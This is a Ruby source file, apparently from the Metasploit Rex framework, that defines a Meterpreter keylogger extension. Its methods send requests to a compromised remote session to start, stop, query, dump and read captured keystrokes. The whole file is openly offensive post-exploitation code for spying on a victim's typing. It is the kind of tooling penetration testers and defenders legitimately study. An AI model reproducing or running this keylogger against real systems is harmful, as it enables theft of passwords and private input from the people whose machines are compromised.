# -*- coding: binary -*-

require 'rex/post/meterpreter/extensions/keylogger/tlv'

module Rex
module Post
module Meterpreter
module Extensions
module Keylogger

###
#
# This meterpreter extension can be used to capture remote keystrokes
#
###
class Keylogger < Extension


  def initialize(client)
    super(client, 'keylogger')

    client.register_extension_aliases(
      [
        {
          'name' => 'keylogger',
          'ext'  => self
        },
      ])
  end

  # Start keylogging
  def capture_start()
    request = Packet.create_request('keylogger_capture_start')
    response = client.send_request(request)
  end

  # Stop keylogging
  def capture_stop()
    request = Packet.create_request('keylogger_capture_stop')
    response = client.send_request(request)
  end

  # Retrieve status about keylogging
  def capture_status()
    request = Packet.create_request('keylogger_capture_status')
    response = client.send_request(request)
    status = response.get_tlv_value(TLV_TYPE_KEYLOGGER_STATUS)
    return status
  end

  # Release captured keylogged data
  def capture_release()
    request = Packet.create_request('keylogger_capture_release')
    response = client.send_request(request)
  end

  # Buffer the current keylogged data to a readable buffer
  def capture_dump()
    request = Packet.create_request('keylogger_capture_dump')
    response = client.send_request(request, 3600)
    records = []
    response.each(TLV_TYPE_KEYLOGGER_CAPTURE_RECORD) { |r|
      records << r.get_tlv_value(TLV_TYPE_KEYLOGGER_CAPTURE_RECORD_NAME)
    }
    return records
  end

  # Retrieve the keylogger data
  def capture_dump_read(record)
    request = Packet.create_request('keylogger_capture_dump_read')
    request.add_tlv(TLV_TYPE_KEYLOGGER_CAPTURE_RECORD_NAME, record.to_s)
    response = client.send_request(request, 3600)
    return response.get_tlv_value(TLV_TYPE_KEYLOGGER_CAPTURE_RECORD_DATA)
  end

end

end; end; end; end; end
